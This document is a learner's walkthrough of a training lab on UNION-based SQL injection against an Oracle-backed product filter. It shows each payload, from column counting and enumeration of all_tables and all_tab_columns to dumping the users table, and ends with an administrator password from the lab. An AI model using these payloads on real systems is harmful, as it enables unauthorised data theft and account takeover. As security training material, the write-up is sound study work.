#  SQL Injection: Listing database contents on Oracle

**Lab Description:** This lab contains an SQL injection vulnerability in the product category filter. The application runs on an **Oracle** database.

According to document, I realize that form of oracle is quite diferent to others.
## 1. Reconnaissance 
* **Detection:** Test `'` to the URL parameter `category`.(any categorizes and same to any type of labs like this)
    * Result: `Internal Server Error` (500).
* **Database Identification:**
    * Tried `category=Gifts'--` -> Error (Oracle requires `FROM` clause).(AS I just mentioned above)
    * Tried `UNION SELECT 'abc', NULL FROM dual--` -> **Success**.(initial, I think we can use any random varibles to fill. However, we don't know exactly it is string or number, so use NULL is fast and safe )
    * Conclusion: **Oracle Database** confirmed.

## 2. Exploitation Steps

**Step 1: Determine number of columns**
Payload: `' ORDER BY 1--` (Success), `' ORDER BY 2--` (Success), `' ORDER BY 3--` (Error).(same previous labs)
-> **Result:** 2 Columns.

**Step 2: Find table names**
Since it's Oracle, I cannot use `information_schema`. Therefore, I use all_tables
Payload:
```sql
' UNION SELECT table_name, NULL FROM all_tables--
```
-> Found table: USERS_BFWPQR


**Step 3:Find column name. I use all_tab_columns** (based on document)
Payload:
```sql
' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name='USERS_BFWPQR'--
```
-> Found columns: USERNAME_JCXAJS, PASSWORD_EXOQQI


**Step 4: Dump Data(same structure lab-02)**
Payload:
```sql
' UNION SELECT USERNAME_JCXAJS, PASSWORD_EXOQQI FROM  USERS_BFWPQR--
```
-> Result account: administrator / password: 3vmps0y2vn65awkpkqyp
